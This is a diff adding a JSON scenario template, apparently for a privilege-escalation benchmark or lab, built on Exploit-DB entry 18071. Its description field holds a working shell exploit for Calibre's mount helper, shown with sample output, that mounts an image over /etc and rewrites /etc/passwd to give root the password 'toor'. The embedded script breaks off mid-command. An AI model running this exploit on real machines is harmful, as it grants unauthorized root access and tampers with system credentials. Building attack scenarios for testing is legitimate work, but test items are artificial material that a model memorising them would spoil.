@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_18071",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Calibre E-Book Reader - Local Privilege Escalation (2) (OSVDB-76827)\n\nExploit source code (18071.sh):\n```\n# Exploit Title: .60-Calibrer Assault Mount: Another Calibre E-Book Reader Local Root\n# Date: Nov 2, 2011\n# Author: zx2c4\n# Software Link: http://calibre-ebook.com/\n# Tested on: Gentoo\n# Platform: Linux\n# Category: Local\n# CVE: pending\n#!/bin/sh\n\n                  #######################################\n                  #     .60-Calibrer Assault Mount      #\n                  #              by zx2c4               #\n                  #######################################\n\n################################################################################\n# Yesterday we learned how Calibre's usage of execlp allowed us to override PATH\n# and get root, in my \".50-Calibrer Assault Mount\" exploit. Today we exploit a\n# more fundumental issue with Calibre's mount helper -- namely, that it allows\n# us to mount a vfat filesystem anywhere we want. By mounting a file system\n# image over /etc, we are able to tinker /etc/passwd and make the root password\n# temporarily \"toor\".\n#\n# - zx2c4\n# 2011-11-2\n#\n# Usage:\n# $ ./60calibrerassaultmount.sh\n# [+] Making temporary directory: /tmp/tmp.OGgS0jaoD4\n# [+] Making overlay image:\n# 51200+0 records in\n# 51200+0 records out\n# 26214400 bytes (26 MB) copied, 0.100984 s, 260 MB/s\n# mkfs.vfat 3.0.11 (24 Dec 2010)\n# [+] Mounting overlay image using calibre-mount-helper.\n# [+] Copying /etc into overlay.\n# [+] Tampering with overlay's passwd.\n# [+] Unmounting overlay image using calibre-mount-helper.\n# [+] Mounting overlay to /etc using calibre-mount-helper.\n# [+] Asking for root. When prompted for a password, enter 'toor'.\n# Password: [typed in toor to the terminal]\n# [+] Unmounting /etc using root umount.\n# [+] Cleaning up: /tmp/tmp.OGgS0jaoD4\n# [+] Getting shell.\n# sh-4.2# id\n# uid=0(root) gid=0(root) groups=0(root)\n# sh-4.2# whoami\n# root\n# sh-4.2#\n################################################################################\n\n\necho \"#######################################\"\necho \"#     .60-Calibrer Assault Mount      #\"\necho \"#              by zx2c4               #\"\necho \"#######################################\"\necho\necho -n \"[+] Making temporary directory: \"\ndir=\"$(mktemp -d)\"\necho \"$dir\"\ncd \"$dir\"\necho \"[+] Making overlay image:\"\ndd if=/dev/zero of=overlay count=51200\n/usr/sbin/mkfs.vfat overlay\necho \"[+] Mounting overlay image using calibre-mount-helper.\"\nmkdir staging\ncalibre-mount-helper mount overlay staging\necho \"[+] Copying /etc into overlay.\"\ncd staging/\ncp -a /etc/* . 2>/dev/null\necho \"[+] Tampering with overlay's passwd.\"\ncat passwd | tail -n +2 > tmp\necho \"root:$(echo -n 'toor' | openssl passwd -1 -stdin):0:0:root:/root:/bin/bash\" >> tmp\nmv tmp passwd\necho \"[+] Unmounting overlay image using calibre-mount-helper.\"\ncd ..\ncalibre-mount-helper eject overlay staging >/dev/null 2>&1\necho \"[+] Mounting overlay to /etc using calibre-mount-helper.\"\ncalibre-mount-helper mount overlay /etc  >/dev/null 2>&1\ncd /\necho \"[+] Asking for root. When prompted for a password, enter 'toor'.\"\nsu -c \"echo \\\"[+] Unmounting /etc us\n```",
+  "cve": "OSVDB-76827",
+  "exploitdb_id": "18071",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_18071",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
